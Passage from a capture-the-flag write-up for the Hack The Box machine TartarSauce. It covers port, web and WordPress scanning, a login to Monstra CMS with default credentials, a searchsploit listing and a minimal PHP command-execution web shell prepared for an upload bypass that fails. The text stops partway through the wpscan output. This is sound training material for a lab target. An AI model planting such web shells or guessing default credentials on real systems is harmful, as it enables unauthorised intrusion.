---
description: 10.10.10.88
---

# TartarSauce

![](<../../.gitbook/assets/1 (4) (1).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - RFI to RCE via vulnerable Wordpress plugin Gwolle to get shell as www-data. Sudo tar to get user onuma.
* Root - Requires code review and understanding of backup script to abuse scheduled job running the script using tar, a SUID binary and making the required changes within a small time window.&#x20;

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.88                                             
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 06:16 EDT
Nmap scan report for 10.10.10.88
Host is up (0.067s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 22.36 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -A -p 80 10.10.10.88 -n
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-05 06:21 EDT
Nmap scan report for 10.10.10.88
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Landing Page
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.12 (93%), Linux 3.13 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   14.60 ms 10.10.14.1
2   14.78 ms 10.10.10.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.27 seconds
```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.88 
http://10.10.10.88 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.88], Title[Landing Page] 
```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.88 -C all 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.88
+ Target Hostname:    10.10.10.88
+ Target Port:        80
+ Start Time:         2021-11-05 06:28:11 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ Entry '/webservices/monstra-3.0.4/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 5 entries which should be manually viewed.
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2a0e, size: 565becf5ff08d, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26488 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-11-05 06:37:29 (GMT-4) (558 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Gobuster

Let's run a gobuster scan against the target.

```
─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.88 -t 50 -q
/webservices (Status: 301)
/server-status (Status: 403)

```

Let's run gobuster again, this time against the webservices directory:

```
// Some code
```

### Website exploration

#### ​ ​Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* There is a robots.txt with 5 disallowed entries, which leads us to the Monstra CMS (v3.0.4)
* There is an admin page here: [http://10.10.10.88/webservices/monstra-3.0.4/admin/](http://10.10.10.88/webservices/monstra-3.0.4/admin/)
* The site issues a PHPSESSID cookie (unauthenticated)
* Dirb also found a Wordpress site: [http://10.10.10.88/webservices/wp/](http://10.10.10.88/webservices/wp/), page source has links to tartarsauce.htb

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Nothing obvious found, seems to be using the default CMS scripts

### Monstra CMS

Let's try login to the admin page with some default cred options: [http://10.10.10.88/webservices/monstra-3.0.4/admin/](http://10.10.10.88/webservices/monstra-3.0.4/admin/)

> root:root
>
> root:password
>
> admin:admin
>
> admin:password

Nice, we are able to login using the following creds - admin:admin

The system provides server, directory and other information, as shown below:

![](<../../.gitbook/assets/2 (1) (1) (1).JPG>)

![](<../../.gitbook/assets/3 (1) (1).JPG>)

Let's check the exploit database with searchsploit:

```
└─$ searchsploit monstra 3.0.4
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Executi | php/webapps/43348.txt
Monstra CMS 3.0.4 - Arbitrary Folder Deletion                                   | php/webapps/44512.txt
Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload                         | php/webapps/48479.txt
Monstra cms 3.0.4 - Persitent Cross-Site Scripting                              | php/webapps/44502.txt
Monstra CMS 3.0.4 - Remote Code Execution (Authenticated)                       | php/webapps/49949.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (1)                                  | php/webapps/44855.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (2)                                  | php/webapps/44646.txt
Monstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking)              | php/webapps/45164.txt
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

There are a few options here. Since we are logged in, we can use one of the exploits that gives us RCE, specifically, EDB-ID 43348. Let's copy this file to the working directory and review it. According to the exploit, we can simply upload a PHP script with a file extention of PHP (all caps) or php7 to bypass the upload restrictions. We should then be able to access the uploaded file and get code execution. First, let's create the script to upload:

```
└─$ cat shell.php7            
<?php

 $cmd=$_GET['cmd'];
 system($cmd);

?>

```

After following the instructions, it appears that the file upload feature does not work. This could be a rabbit hole. Let's move on for now and come back to this later if we get stuck.

After browsing the admin site a bit more, we find the plugins page, which lists the installed plugins. There is however also an option to install the "Sandbox" plugin. Unfortuantely we cannot install that, or indeed "Delete" or upload anything here either.

![](<../../.gitbook/assets/6 (1) (1) (1) (1) (1).JPG>)

Let's move on for now. If we do not find anything else, we may need to come back to this, however, based on the checks done thus far, this implementation of Monstra has been severely modified and restricted, and so it may not be the way into the target.

### Wordpress, Wpscan & Obfuscation

Le's visit the page at [http://10.10.10.88/webservices/wp/](http://10.10.10.88/webservices/wp/)&#x20;

![](<../../.gitbook/assets/4 (1) (1) (1) (1).JPG>)

Let's run wpscan next to see what we get. After running it with the default mode, the results reported that there are no plugins detected.

```
└─$ wpscan --url http://10.10.10.88/webservices/wp -e ap,at,cb,u,m --api-token "your_api_token_here"       
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88]
[+] Started: Sat Nov  6 05:00:50 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'WordPress 4.9.4'
 |
 | [!] 32 vulnerabilities identified:
 |
 | [!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
 |     References:
 |      - https://wpscan.com/vulnerability/5e0c1ddd-fdd0-421b-bdbe-3eee6b75c919
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
 |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
 |      - https://github.com/quitten/doser.py
 |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html
 |
 | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/835614a2-ad92-4027-b485-24b39038171d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
 |
 | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/01b587e0-0a86-47af-a088-6e5e350e8247
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
 |
 | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/2b7c77c3-8dbc-4a2a-9ea3-9929c3373557
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
 |
 | [!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
 |     Fixed in: 4.9.7
 |     References:
 |      - https://wpscan.com/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/e3ef8976-11cb-4854-837f-786f43cbdf44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/999dba5a-82fb-4717-89c3-6ed723cc7e45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/046ff6a0-90b2-4251-98fc-b7fba93f8334
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/3182002e-d831-4412-a27d-a5e39bb44314
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/7f7a0795-4dd7-417d-804e-54f12595d1e4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/65f1aec4-6d28-4396-88d7-66702b21c7a2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/d741f5ae-52ca-417d-a2ca-acdfb7ca5808
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
 |
 | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/1a693e57-f99c-4df6-93dd-0cdc92fd0526
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
 |
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.10
 |     References:
 |      - https://wpscan.com/vulnerability/d150f43f-6030-4191-98b8-20ae05585936
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 4.9.11
 |     References:
 |      - https://wpscan.com/vulnerability/4494a903-5a73-4cad-8c14-1e7b4da2be61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/d005b1f8-749d-438a-8818-21fba45c6465
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/7804d8ed-457a-407e-83a7-345d3bbe07b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/26a26de2-d598-405d-b00c-61f71cfacff6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/715c00e3-5302-44ad-b914-131c162c3f71
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/4a6de154-5fbd-4c80-acd3-8902ee431bd8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/23553517-34e3-40a9-a406-f3ffbe9dd265
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20042
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/be794159-4486-4ae1-a5cc-5c190e5ddf5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
 |
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47634/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
 |
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47633/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
 |
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47637/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47638/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
 |      - https://hackerone.com/reports/179695
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     Fixed in: 4.9.17
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 4.9.18
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:01:30 <==============================> (23213 / 23213) 100.00% Time: 00:01:30
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentyfifteen
 | Location: http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/, status: 500
 |
 | Version: 1.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.9'

[+] twentyseventeen
 | Location: http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 1.4'

[+] twentysixteen
 | Location: http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/style.css
 | Style Name: Twenty Sixteen
